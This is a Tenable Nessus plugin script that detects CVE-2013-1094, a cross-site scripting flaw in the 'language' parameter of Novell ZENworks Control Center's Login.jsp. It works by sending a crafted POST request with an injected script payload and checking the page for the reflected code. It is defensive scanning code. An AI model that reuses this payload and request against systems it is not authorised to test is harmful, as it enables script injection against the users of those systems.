#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66915);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 21:17:13 $");

  script_cve_id("CVE-2013-1094");
  script_bugtraq_id(60318);
  script_osvdb_id(93877);

  script_name(english:"Novell ZENworks Configuration Console Login.jsp language Parameter XSS");
  script_summary(english:"Tries to exploit cross-site scripting flaw in ZENworks login page");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a script that is affected by a cross-site
scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts a version of the ZENworks Configuration
Console that is affected by a cross-site scripting vulnerability.  The
'language' parameter is not properly validated in 'Login.jsp' and can be
tampered with to inject arbitrary script code in a user's browser via a
specially crafted POST request. 

Note that hosts that are affected by this issue are also likely to be
affected by other vulnerabilities.");
  script_set_attribute(attribute:"see_also", value:"http://www.novell.com/support/kb/doc.php?id=7012025");
  script_set_attribute(attribute:"see_also", value:"http://www.novell.com/support/kb/doc.php?id=7012501");
  script_set_attribute(attribute:"solution", value:"Upgrade to 11.2.3a Monthly Update 1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/06/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/06/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:zenworks_configuration_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("novell_zenworks_control_center_detect.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("www/zenworks_control_center");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:443);

install = get_install_from_kb(
  appname      : "zenworks_control_center",
  port         : port,
  exit_on_fail : TRUE
);

xss = "'; alert('" + str_replace(find:'_', replace:'-', string:SCRIPT_NAME) + "'); a='";
match_str = "njwc._locale = '" + xss + "';";

postdata = "__EVENTTARGET=language&" +
	   "__EVENTARGUMENT=&" +
	   "__VIEWSTATEVERSION=18&" +
	   "__BACKCHECK=true&" +
	   "timezone=240&" +
	   "fwdToURL=&" +
	   "username=admin&" +
	   "password=&" +
	   "language=" + urlencode(str:xss);

r = http_send_recv3(
      method  : "POST",
      port    : port,
      item    : "/zenworks/jsp/fw/internal/Login.jsp",
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata
    );

if (
  match_str >< r[2] &&
  "ZENworks Control Center" >< r[2] &&
  'njwc.setControlData(\'language\'' >< r[2]
)
{
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  if (report_verbosity > 0)
  {
    report =
    '\nNessus was able to exploit the vulnerability with the following' +
    '\nrequest : \n\n' +
    crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n' +
    chomp(http_last_sent_request()) +
    '\n' + crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';

    if (report_verbosity > 1)
    {
      i = stridx(r[2], "njwc.setControlData('language'");
      j = stridx(r[2], '</script>', i);

      if (!isnull(i) && !isnull(j))
      {
        html = substr(r[2], i, j+8);
        report +=
        '\nThe following response snippet includes the injected code : \n\n' +
        crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n' +
        html +
        '\n' + crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';
      }
    }
    security_warning(extra:report, port:port);
  }
  else security_warning(port);
}
else
 audit(AUDIT_WEB_APP_NOT_AFFECTED, "Novell ZENworks Control Center", build_url(port:port, qs:'/'));
